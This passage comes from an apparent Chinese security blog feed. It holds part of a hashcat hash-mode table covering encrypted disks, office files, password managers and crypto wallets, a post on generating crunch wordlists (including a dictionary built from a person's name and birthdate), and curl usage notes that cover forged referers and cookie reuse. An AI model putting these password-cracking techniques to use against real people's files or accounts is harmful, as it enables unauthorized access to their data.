Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">205</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">206</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">207</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">208</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">209</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">210</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">211</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">212</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">213</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">214</span></pre></td><td class="code"><pre><span class="line">    Y | 3 &#x3D; XTS 1536 bit all                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">215</span></pre></td><td class="code"><pre><span class="line"> 8800 | Android FDE &lt;&#x3D; 4.3                               | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">216</span></pre></td><td class="code"><pre><span class="line">12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">217</span></pre></td><td class="code"><pre><span class="line">12200 | eCryptfs                                         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">218</span></pre></td><td class="code"><pre><span class="line">137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">219</span></pre></td><td class="code"><pre><span class="line">   X  | 1 &#x3D; PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">220</span></pre></td><td class="code"><pre><span class="line">   X  | 2 &#x3D; PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">221</span></pre></td><td class="code"><pre><span class="line">   X  | 3 &#x3D; PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">222</span></pre></td><td class="code"><pre><span class="line">   X  | 4 &#x3D; PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">223</span></pre></td><td class="code"><pre><span class="line">   X  | 5 &#x3D; PBKDF2-HMAC-SHA256                           | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">224</span></pre></td><td class="code"><pre><span class="line">   X  | 6 &#x3D; PBKDF2-HMAC-SHA256 + boot-mode               | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">225</span></pre></td><td class="code"><pre><span class="line">   X  | 7 &#x3D; PBKDF2-HMAC-Streebog-512                     | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">226</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">227</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">228</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">229</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Camellia                   | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">230</span></pre></td><td class="code"><pre><span class="line">    Y | 1 &#x3D; XTS  512 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">231</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">232</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">233</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">234</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Camellia                   | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">235</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">236</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">237</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Camellia-Kuznyechik    | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">238</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Camellia-Serpent       | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">239</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Kuznyechik-AES         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">240</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Kuznyechik-Twofish     | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">241</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">242</span></pre></td><td class="code"><pre><span class="line">    Y | 2 &#x3D; XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">243</span></pre></td><td class="code"><pre><span class="line">    Y | 3 &#x3D; XTS 1536 bit all                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">244</span></pre></td><td class="code"><pre><span class="line">14600 | LUKS                                             | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">245</span></pre></td><td class="code"><pre><span class="line">16700 | FileVault 2                                      | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">246</span></pre></td><td class="code"><pre><span class="line">18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">247</span></pre></td><td class="code"><pre><span class="line"> 9700 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4               | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">248</span></pre></td><td class="code"><pre><span class="line"> 9710 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4, collider #1  | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">249</span></pre></td><td class="code"><pre><span class="line"> 9720 | MS Office &lt;&#x3D; 2003 $0&#x2F;$1, MD5 + RC4, collider #2  | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">250</span></pre></td><td class="code"><pre><span class="line"> 9800 | MS Office &lt;&#x3D; 2003 $3&#x2F;$4, SHA1 + RC4              | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">251</span></pre></td><td class="code"><pre><span class="line"> 9810 | MS Office &lt;&#x3D; 2003 $3, SHA1 + RC4, collider #1    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">252</span></pre></td><td class="code"><pre><span class="line"> 9820 | MS Office &lt;&#x3D; 2003 $3, SHA1 + RC4, collider #2    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">253</span></pre></td><td class="code"><pre><span class="line"> 9400 | MS Office 2007                                   | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">254</span></pre></td><td class="code"><pre><span class="line"> 9500 | MS Office 2010                                   | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">255</span></pre></td><td class="code"><pre><span class="line"> 9600 | MS Office 2013                                   | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">256</span></pre></td><td class="code"><pre><span class="line">10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">257</span></pre></td><td class="code"><pre><span class="line">10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">258</span></pre></td><td class="code"><pre><span class="line">10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">259</span></pre></td><td class="code"><pre><span class="line">10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">260</span></pre></td><td class="code"><pre><span class="line">10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">261</span></pre></td><td class="code"><pre><span class="line">10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">262</span></pre></td><td class="code"><pre><span class="line">16200 | Apple Secure Notes                               | Documents</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">263</span></pre></td><td class="code"><pre><span class="line"> 9000 | Password Safe v2                                 | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">264</span></pre></td><td class="code"><pre><span class="line"> 5200 | Password Safe v3                                 | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">265</span></pre></td><td class="code"><pre><span class="line"> 6800 | LastPass + LastPass sniffed                      | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">266</span></pre></td><td class="code"><pre><span class="line"> 6600 | 1Password, agilekeychain                         | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">267</span></pre></td><td class="code"><pre><span class="line"> 8200 | 1Password, cloudkeychain                         | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">268</span></pre></td><td class="code"><pre><span class="line">11300 | Bitcoin&#x2F;Litecoin wallet.dat                      | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">269</span></pre></td><td class="code"><pre><span class="line">12700 | Blockchain, My Wallet                            | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">270</span></pre></td><td class="code"><pre><span class="line">15200 | Blockchain, My Wallet, V2                        | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">271</span></pre></td><td class="code"><pre><span class="line">16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">272</span></pre></td><td class="code"><pre><span class="line">13400 | KeePass 1 (AES&#x2F;Twofish) and KeePass 2 (AES)      | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">273</span></pre></td><td class="code"><pre><span class="line">15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">274</span></pre></td><td class="code"><pre><span class="line">15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">275</span></pre></td><td class="code"><pre><span class="line">15700 | Ethereum Wallet, SCRYPT                          | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">276</span></pre></td><td class="code"><pre><span class="line">16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">277</span></pre></td><td class="code"><pre><span class="line">16900 | Ansible Vault                                    | Password Managers</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">278</span></pre></td><td class="code"><pre><span class="line">18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">279</span></pre></td><td class="code"><pre><span class="line">99999 | Plaintext                                        | Plaintext</span></pre></td></tr></table></figure></li></ul><pre><code>```</code></pre>]]></content>
    
    <summary type="html">
    
      利用hashcat进行hash密码破解
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="command" scheme="http://h3art3ars.github.io/tags/command/"/>
    
      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
    
      <category term="hash密码破解" scheme="http://h3art3ars.github.io/tags/hash%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>crunch</title>
    <link href="http://h3art3ars.github.io/2019/12/11/crunch/"/>
    <id>http://h3art3ars.github.io/2019/12/11/crunch/</id>
    <published>2019-12-11T06:36:27.000Z</published>
    <updated>2019-12-11T06:39:27.175Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h1><ul><li><h2 id="快捷使用"><a href="#快捷使用" class="headerlink" title="快捷使用"></a>快捷使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">crunch 4 4 -t %^@,    &#x2F;&#x2F;生成4位数字，特殊字符，小写大写字母</span></pre></td></tr></table></figure></li><li><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">  max    设定最大字符串长度（必选）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  &#x2F;&#x2F;默认位小写字符集</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  oprions</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  -b     指定文件输出的大小，避免字典文件过大  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  -c     指定文件输出的行数，即包含密码的个数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  -d     限制相同元素出现的次数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  -e     定义停止字符，即到该字符串就停止生成</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  -f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  -i     改变输出格式，即aaa,aab -&gt; aaa,baa</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  -I     通常与-t联合使用，表明该字符为实义字符</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  -m     通常与-p搭配</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  -o     将密码保存到指定文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  -p     指定元素以组合的方式进行</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  -q     读取密码文件，即读取pass.txt</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  -r     定义重某一字符串重新开始</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  -s     指定一个开始的字符，即从自己定义的密码xxxx开始</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">  -t     指定密码输出的格式</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">  -u     禁止打印百分比（必须为最后一个选项）</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">  -z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z</span></pre></td></tr></table></figure><ul><li><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ol><li><p>生成自己制定字符集的字典(字符集中有空格需要双引号或者空格转义)</p><p><code>crunch 2 4 &quot;abc &quot;</code></p></li><li><p>生成数个元素组合（社工字典 max min参数无效）</p><p><code>crunch 4 4 -p zhangsan 2018 0101</code></p></li><li><p>生成某字符串的所有组合</p><p><code>crunch 4 4 -p abc</code></p></li><li><p>生成指定格式字符串</p><p><code>crunch 4 4 -t %^@, -o ./dict.txt</code></p></li><li><p>设置字符集</p><p><code>crunch 6 6 -f /usr/share/crunch/charset.lst 字符集 -t %%dog@ //@表示当前字符集</code></p></li><li><p>指定某类字符的集合</p><p>生成3位密码，第一位由是123，第三位bcd,<strong>+为占位符</strong></p><p><code>crunch 3 3 bcd + 123 + -t %@^ -f charset.lst  mixalpha-numeric-all-space</code></p></li><li><p>生成5个元素组成的密码，前三个为固定字符，后两个为小写大写字符,<strong>d为占位符</strong></p><p><code>crunch 5 5 -t ddd@, -p dog cat bird</code></p></li><li><p>去除-t参数中的特殊字符含义,<strong>a为占位符</strong></p><p><code>crunch 5 5 -t p@as% -I a@aaa</code></p></li></ol></li><li><p>详情</p><p><a href="https://blog.csdn.net/fox_wayen/article/details/78429140" target="_blank" rel="noopener">详解</a></p></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      crunch 生成字典
    
    </summary>
    
    
      <category term="tools" scheme="http://h3art3ars.github.io/categories/tools/"/>
    
    
      <category term="linux" scheme="http://h3art3ars.github.io/tags/linux/"/>
    
      <category term="tools" scheme="http://h3art3ars.github.io/tags/tools/"/>
    
      <category term="kali" scheme="http://h3art3ars.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>curl</title>
    <link href="http://h3art3ars.github.io/2019/12/11/curl/"/>
    <id>http://h3art3ars.github.io/2019/12/11/curl/</id>
    <published>2019-12-11T06:20:07.000Z</published>
    <updated>2019-12-17T01:35:06.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> 在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称url为下载工具。 </p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">语法：# curl [option] [url]</span></pre></td></tr></table></figure><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-A&#x2F;--user-agent &lt;string&gt;                  设置UA发送给服务器</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">-b&#x2F;--cookie &lt;name&#x3D;string&#x2F;file&gt;        cookie字符串或文件读取位置</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">-c&#x2F;--cookie-jar &lt;file&gt;                    操作结束后把cookie写入到这个文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-C&#x2F;--continue-at &lt;offset&gt;             断点续转</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">-D&#x2F;--dump-header &lt;file&gt;               把header信息写入到该文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">-e&#x2F;--referer                              来源网址</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">-f&#x2F;--fail                                 连接失败时不显示http错误</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">-o&#x2F;--output                               把输出写到该文件中</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">-O&#x2F;--remote-name                       把输出写到该文件中，保留远程文件的文件名</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">-r&#x2F;--range &lt;range&gt;                        检索来自HTTP&#x2F;1.1或FTP服务器字节范围</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">-s&#x2F;--silent                               静音模式。不输出任何东西</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">-T&#x2F;--upload-file &lt;file&gt;                   上传文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">-u&#x2F;--user &lt;user[:password]&gt;          设置服务器的用户和密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">-w&#x2F;--write-out [format]                   什么输出完成后</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">-x&#x2F;--proxy &lt;host[:port]&gt;                 在给定的端口上使用HTTP代理</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">-#&#x2F;--progress-bar                         进度条显示当前的传送状态</span></pre></td></tr></table></figure><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><ol><li><p><code>curl http://www.befallhell.cn</code></p><p>将结果输出到标准输出</p></li><li><p><code>curl http://www.befallhell.com &gt;&gt; file</code></p><p><code>curl http://www.befallhell.com -o file</code></p><p><code>curl  -O http://www.befallhell.cn/test.html</code></p><p>结果输出到文件或服务端同名文件</p><ol start="3"><li><p><code>curl -o /dev/null -s -w %{http_code} http://www.befallhell.cn</code></p><p>测试网页返回值 </p></li></ol></li><li><p><code>curl -x 192.168.100.100:1080 http://www.befallhell.cn</code></p><p> 指定proxy服务器以及其端口 </p></li><li><p><code>curl -c cookies.txt http://www.befallhell.cn</code></p><p><code>curl -D header.txt http://www.befallhell.cn</code></p><p>保存cookie与header</p></li><li><p><code>curl -b cookies.txt http://www.befallhell.cn</code></p><p>使用cookies文件</p></li><li><p><code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot;  http://www.befallhell.cn</code></p><p>更改</p></li><li><p><code>curl -e &quot;127.0.0.1&quot; http://www.befallhell.cn</code></p><p> 伪造referer</p></li><li><p><code>curl -O -# ftp://用户名:密码@http://www.befallhell.cn/1.jpg</code></p><p> ftp下载并显示下载进度条</p></li><li><p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://http://www.befallhell.cn/public/</code></p><p>上传文件</p></li><li><p><code>curl -I http://www.befallhell.cn</code></p><p> 显示头信息</p></li><li><p>get方法</p><p> <code>curl &quot;http://ip?id=1&quot;</code></p></li><li><p>-H –header 使用时要多次使用</p><p> <code>curl -H &quot;Host:127.0.0.1&quot; -H &quot;Referer: 127.0.0.1&quot;</code></p></li><li><p><code>-A</code>,<code>-b</code>,<code>-e</code> 分别是<code>user-agent,cookie,referer,</code></p></li></ol><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">-a&#x2F;--append                        上传文件时，附加到目标文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">--anyauth                            可以使用“任何”身份验证方法</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">--basic                                使用HTTP基本验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">-B&#x2F;--use-ascii                      使用ASCII文本传输</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">*-d&#x2F;--data &lt;data&gt;                  HTTP POST方式传送数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">--data-ascii &lt;data&gt;            以ascii的方式post数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">--data-binary &lt;data&gt;          以二进制的方式post数据</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">--negotiate                          使用HTTP身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">--digest                        使用数字身份验证</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">--disable-eprt                  禁止使用EPRT或LPRT</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">--disable-epsv                  禁止使用EPSV</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">--egd-file &lt;file&gt;              为随机数据(SSL)设置EGD socket路径</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">--tcp-nodelay                  使用TCP_NODELAY选项</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">-E&#x2F;--cert &lt;cert[:passwd]&gt;      客户端证书文件和密码 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">--cert-type &lt;type&gt;              证书文件类型 (DER&#x2F;PEM&#x2F;ENG) (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">--key &lt;key&gt;                    私钥文件名 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">--key-type &lt;type&gt;              私钥文件类型 (DER&#x2F;PEM&#x2F;ENG) (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">--pass  &lt;pass&gt;                  私钥密码 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">--engine &lt;eng&gt;                  加密引擎使用 (SSL). &quot;--engine list&quot; for list</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">--cacert &lt;file&gt;                CA证书 (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">--capath &lt;directory&gt;            CA目   (made using c_rehash) to verify peer against (SSL)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">--ciphers &lt;list&gt;                SSL密码</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">--compressed                    要求返回是压缩的形势 (using deflate or gzip)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">--connect-timeout &lt;seconds&gt;    设置最大请求时间</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">--create-dirs                  建立本地目录的目录层次结构</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">--crlf                          上传是把LF转变成CRLF</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">--ftp-create-dirs              